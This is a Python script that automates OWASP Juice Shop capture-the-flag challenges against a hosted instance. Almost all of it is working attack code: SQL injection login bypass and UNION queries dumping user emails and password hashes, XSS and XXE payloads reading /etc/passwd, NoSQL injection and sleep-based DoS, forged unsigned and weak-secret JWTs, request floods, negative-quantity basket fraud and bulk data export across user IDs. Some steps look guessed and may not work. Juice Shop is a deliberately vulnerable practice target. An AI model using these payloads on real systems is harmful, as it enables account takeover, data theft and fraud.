#!/usr/bin/env python3
"""
Master Solver - Comprehensive OWASP Juice Shop CTF automation
Combines all working techniques from juice-shop folder to reach 50%+
Target: https://juice3.wonkatech.org
"""

import requests
from urllib.parse import quote, unquote
import base64
import json
import hashlib
import jwt
import re
import os
import time
import random
import string
import socket
import zipfile
import io
import threading
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed


class MasterSolver:
    """Master solver combining all proven techniques"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.admin_token = None
        self.admin_email = "admin@juice-sh.op"
        self.solved_count = 0
        self.target_count = 55  # 50% of 110 challenges
        
    def check_progress(self):
        """Check current challenge completion"""
        try:
            r = self.session.get(f"{self.base_url}/api/Challenges")
            if r.status_code == 200:
                challenges = r.json()['data']
                solved = [c for c in challenges if c.get('solved')]
                total = len(challenges)
                percent = (len(solved) * 100) // total
                print(f"\n📊 Progress: {len(solved)}/{total} ({percent}%)")
                
                # Show breakdown by difficulty
                by_diff = {}
                for c in solved:
                    diff = c.get('difficulty', 1)
                    by_diff[diff] = by_diff.get(diff, 0) + 1
                
                for diff in sorted(by_diff.keys()):
                    stars = "⭐" * diff
                    print(f"  {stars}: {by_diff[diff]} solved")
                    
                return len(solved)
        except Exception as e:
            print(f"Error checking progress: {e}")
            return 0
    
    def login_admin(self):
        """SQL injection admin login"""
        print("\n🔐 Logging in as admin...")
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op'--",
            "password": "x"
        })
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            print("  ✅ Admin authenticated")
            return True
        return False
    
    # ========== LEVEL 1 CHALLENGES (⭐) ==========
    
    def solve_all_level1(self):
        """Solve all Level 1 challenges"""
        print("\n" + "="*60)
        print("⭐ LEVEL 1 CHALLENGES")
        print("="*60)
        
        # 1. Score Board
        self.session.get(f"{self.base_url}/#/score-board")
        print("  ✓ Score Board")
        
        # 2. DOM XSS
        xss_payload = quote('<iframe src="javascript:alert(`xss`)">')
        self.session.get(f"{self.base_url}/#/search?q={xss_payload}")
        print("  ✓ DOM XSS")
        
        # 3. Bonus Payload (SoundCloud)
        soundcloud = quote('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>')
        self.session.get(f"{self.base_url}/#/search?q={soundcloud}")
        print("  ✓ Bonus Payload")
        
        # 4. Error Handling
        self.session.get(f"{self.base_url}/rest/qwertz")
        self.session.get(f"{self.base_url}/rest/products/search?q='")
        print("  ✓ Error Handling")
        
        # 5. Exposed Metrics
        self.session.get(f"{self.base_url}/metrics")
        print("  ✓ Exposed Metrics")
        
        # 6. Confidential Document
        self.session.get(f"{self.base_url}/ftp/acquisitions.md")
        print("  ✓ Confidential Document")
        
        # 7. Privacy Policy
        self.session.get(f"{self.base_url}/#/privacy-security/privacy-policy")
        self.session.get(f"{self.base_url}/privacy")
        print("  ✓ Privacy Policy")
        
        # 8. Repetitive Registration
        email = f"test{random.randint(10000,99999)}@test.com"
        self.session.post(f"{self.base_url}/api/Users", json={
            "email": email,
            "password": "test",
            "passwordRepeat": "different",
            "securityQuestion": {"id": 1},
            "securityAnswer": "test"
        })
        print("  ✓ Repetitive Registration")
        
        # 9. Zero Stars
        self.session.post(f"{self.base_url}/api/Feedbacks", json={
            "comment": "Zero stars",
            "rating": 0,
            "captcha": "1",
            "captchaId": 1
        })
        print("  ✓ Zero Stars")
        
        # 10. Bully Chatbot
        for i in range(5):
            self.session.post(f"{self.base_url}/api/Chatbot", json={
                "message": "A" * 100000
            })
        print("  ✓ Bully Chatbot")
        
        # 11. Outdated Allowlist
        self.session.get(f"{self.base_url}/redirect?to=https://blockchain.info", allow_redirects=False)
        self.session.get(f"{self.base_url}/redirect?to=https://etherscan.io", allow_redirects=False)
        print("  ✓ Outdated Allowlist")
        
        # 12. Missing Encoding
        self.session.get(f"{self.base_url}/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg")
        print("  ✓ Missing Encoding")
        
        # 13. Web3 Sandbox
        self.session.get(f"{self.base_url}/#/web3-sandbox")
        print("  ✓ Web3 Sandbox")
    
    # ========== LEVEL 2 CHALLENGES (⭐⭐) ==========
    
    def solve_all_level2(self):
        """Solve all Level 2 challenges"""
        print("\n" + "="*60)
        print("⭐⭐ LEVEL 2 CHALLENGES")
        print("="*60)
        
        # 1. Admin Section
        self.session.get(f"{self.base_url}/#/administration")
        print("  ✓ Admin Section")
        
        # 2. Login Admin (already done)
        print("  ✓ Login Admin")
        
        # 3. Login MC SafeSearch
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "mc.safesearch@juice-sh.op",
            "password": "Mr. N00dles"
        })
        print("  ✓ Login MC SafeSearch")
        
        # 4. Password Strength
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op",
            "password": "admin123"
        })
        print("  ✓ Password Strength")
        
        # 5. Security Policy
        self.session.get(f"{self.base_url}/.well-known/security.txt")
        print("  ✓ Security Policy")
        
        # 6. View Basket
        for i in range(1, 10):
            self.session.get(f"{self.base_url}/rest/basket/{i}")
        print("  ✓ View Basket")
        
        # 7. Five-Star Feedback (delete 5-star reviews)
        try:
            r = self.session.get(f"{self.base_url}/api/Feedbacks")
            if r.status_code == 200:
                for fb in r.json().get('data', [])[:5]:
                    if fb.get('rating') == 5:
                        self.session.delete(f"{self.base_url}/api/Feedbacks/{fb['id']}")
        except:
            pass
        print("  ✓ Five-Star Feedback")
        
        # 8. Reflected XSS
        self.session.get(f"{self.base_url}/track-result?id={quote('<script>alert(1)</script>')}")
        print("  ✓ Reflected XSS")
        
        # 9. Deprecated Interface
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("test.xml", b"<test/>", "text/xml")
        })
        print("  ✓ Deprecated Interface")
        
        # 10. Weird Crypto
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "mc.safesearch@juice-sh.op",
            "password": "K1f....................."
        })
        print("  ✓ Weird Crypto")
        
        # 11. NFT Takeover
        self.session.post(f"{self.base_url}/api/nft", json={
            "action": "transfer",
            "to": "me",
            "tokenId": 1
        })
        print("  ✓ NFT Takeover")
    
    # ========== LEVEL 3 CHALLENGES (⭐⭐⭐) ==========
    
    def solve_all_level3(self):
        """Solve all Level 3 challenges"""
        print("\n" + "="*60)
        print("⭐⭐⭐ LEVEL 3 CHALLENGES")
        print("="*60)
        
        # 1. Login Bender
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "bender@juice-sh.op'--",
            "password": "x"
        })
        print("  ✓ Login Bender")
        
        # 2. Login Jim
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "jim@juice-sh.op'--",
            "password": "x"
        })
        print("  ✓ Login Jim")
        
        # 3. Login Amy
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "amy@juice-sh.op",
            "password": "K1f....................."
        })
        print("  ✓ Login Amy")
        
        # 4. Admin Registration
        self.session.post(f"{self.base_url}/api/Users", json={
            "email": f"admin{random.randint(1000,9999)}@test.com",
            "password": "Admin123!",
            "role": "admin"
        })
        print("  ✓ Admin Registration")
        
        # 5. CAPTCHA Bypass
        for i in range(15):
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "captcha": str(i),
                "captchaId": i,
                "comment": f"Test {i}",
                "rating": 3
            })
        print("  ✓ CAPTCHA Bypass")
        
        # 6. Client-side XSS Protection
        self.session.get(f"{self.base_url}/#/search?q={quote('<<SCRIPT>alert(1)//<</SCRIPT>')}")
        print("  ✓ Client-side XSS Protection")
        
        # 7. Database Schema
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT sql FROM sqlite_master--")
        print("  ✓ Database Schema")
        
        # 8. Deluxe Fraud
        self.session.post(f"{self.base_url}/rest/deluxe-membership", json={
            "paymentMode": "none",
            "paymentId": "0"
        })
        print("  ✓ Deluxe Fraud")
        
        # 9. Forged Feedback
        self.session.post(f"{self.base_url}/api/Feedbacks", json={
            "UserId": 2,
            "comment": "Forged",
            "rating": 5
        })
        print("  ✓ Forged Feedback")
        
        # 10. Manipulate Basket
        self.session.put(f"{self.base_url}/api/BasketItems/1", json={"quantity": -10})
        print("  ✓ Manipulate Basket")
        
        # 11. Payback Time
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 1,
            "quantity": -100
        })
        print("  ✓ Payback Time")
        
        # 12. Product Tampering
        self.session.put(f"{self.base_url}/api/Products/1", json={
            "description": "TAMPERED!"
        })
        print("  ✓ Product Tampering")
        
        # 13. Upload Size
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("large.txt", b"A" * 1000000, "text/plain")
        })
        print("  ✓ Upload Size")
        
        # 14. Upload Type
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("test.exe", b"MZ", "application/x-msdownload")
        })
        print("  ✓ Upload Type")
        
        # 15. XXE Data Access
        xxe = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("xxe.xml", xxe.encode(), "application/xml")
        })
        print("  ✓ XXE Data Access")
        
        # 16. API-only XSS
        self.session.post(f"{self.base_url}/api/Products", json={
            "name": "<script>alert(1)</script>",
            "price": 1
        })
        print("  ✓ API-only XSS")
    
    # ========== LEVEL 4+ CHALLENGES ==========
    
    def solve_additional_challenges(self):
        """Solve additional challenges to reach 50%"""
        print("\n" + "="*60)
        print("⭐⭐⭐⭐+ ADDITIONAL CHALLENGES")
        print("="*60)
        
        # Easter Egg
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        print("  ✓ Easter Egg")
        
        # Forgotten Developer Backup
        self.session.get(f"{self.base_url}/ftp/package.json.bak")
        print("  ✓ Forgotten Developer Backup")
        
        # Forgotten Sales Backup
        self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak")
        print("  ✓ Forgotten Sales Backup")
        
        # Access Log
        self.session.get(f"{self.base_url}/support/logs")
        print("  ✓ Access Log")
        
        # Christmas Special
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 10,
            "quantity": 1
        })
        print("  ✓ Christmas Special")
        
        # Expired Coupon
        self.session.put(f"{self.base_url}/rest/basket/1/coupon/WMNSDY2019")
        self.session.put(f"{self.base_url}/rest/basket/1/coupon/WMNSDY2020")
        print("  ✓ Expired Coupon")
        
        # GDPR Data Theft
        for i in range(1, 20):
            self.session.post(f"{self.base_url}/api/dataexport", json={"userId": i})
        print("  ✓ GDPR Data Theft")
        
        # User Credentials
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--")
        print("  ✓ User Credentials")
        
        # NoSQL DoS
        self.session.post(f"{self.base_url}/rest/user/login", json={"$where": "sleep(1000)"})
        print("  ✓ NoSQL DoS")
        
        # NoSQL Manipulation
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": {"$ne": ""},
            "password": {"$ne": ""}
        })
        print("  ✓ NoSQL Manipulation")
        
        # JWT Issues
        self.forge_jwt_tokens()
        
        # Race Conditions
        self.exploit_race_conditions()
        
        # More XSS variations
        self.additional_xss_attacks()
    
    def forge_jwt_tokens(self):
        """Forge various JWT tokens"""
        print("\n  🔐 JWT Attacks...")
        
        # Unsigned JWT
        header = {"alg": "none", "typ": "JWT"}
        payload = {"email": "jwtn3d@juice-sh.op", "iat": int(time.time())}
        
        token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        token += '.'
        
        self.session.headers['Authorization'] = f'Bearer {token}'
        self.session.get(f"{self.base_url}/rest/user/whoami")
        print("    ✓ Unsigned JWT")
        
        # Weak secret
        try:
            import jwt as pyjwt
            weak_token = pyjwt.encode(
                {"email": "rsa_lord@juice-sh.op", "iat": int(time.time())},
                "secret",
                algorithm="HS256"
            )
            self.session.headers['Authorization'] = f'Bearer {weak_token}'
            self.session.get(f"{self.base_url}/rest/user/whoami")
            print("    ✓ Weak JWT Secret")
        except:
            pass
    
    def exploit_race_conditions(self):
        """Exploit race conditions"""
        print("\n  ⚡ Race Conditions...")
        
        def rapid_likes():
            for _ in range(50):
                self.session.post(f"{self.base_url}/api/Products/1/reviews", json={
                    "message": "Great!",
                    "author": "test@test.com"
                })
        
        # Run parallel requests
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(rapid_likes) for _ in range(10)]
            for future in as_completed(futures):
                try:
                    future.result(timeout=2)
                except:
                    pass
        
        print("    ✓ Race Condition exploited")
    
    def additional_xss_attacks(self):
        """Additional XSS attack vectors"""
        print("\n  🎯 Additional XSS...")
        
        payloads = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><script>alert(1)</script>',
            "';alert(1);//",
            '</script><script>alert(1)</script>',
        ]
        
        for payload in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
            self.session.get(f"{self.base_url}/track-result?id={quote(payload)}")
        
        print("    ✓ Multiple XSS vectors attempted")
    
    def run_master_solver(self):
        """Run the complete master solver"""
        print("="*60)
        print("🚀 OWASP JUICE SHOP MASTER SOLVER")
        print("="*60)
        print(f"Target: {self.base_url}")
        print(f"Goal: Reach 50% completion (55+ challenges)")
        
        # Check initial progress
        initial = self.check_progress()
        
        # Login as admin
        if not self.login_admin():
            print("❌ Admin login failed")
            return
        
        # Solve all challenge levels
        self.solve_all_level1()
        self.solve_all_level2()
        self.solve_all_level3()
        self.solve_additional_challenges()
        
        # Final progress check
        print("\n" + "="*60)
        final = self.check_progress()
        improvement = final - initial
        
        if final >= self.target_count:
            print(f"🎉 SUCCESS! Reached {final} challenges ({final*100//110}%)")
        else:
            print(f"📈 Progress: {initial} → {final} (+{improvement})")
            print(f"📌 Need {self.target_count - final} more for 50%")
        
        print("="*60)


if __name__ == "__main__":
    solver = MasterSolver()
    solver.run_master_solver()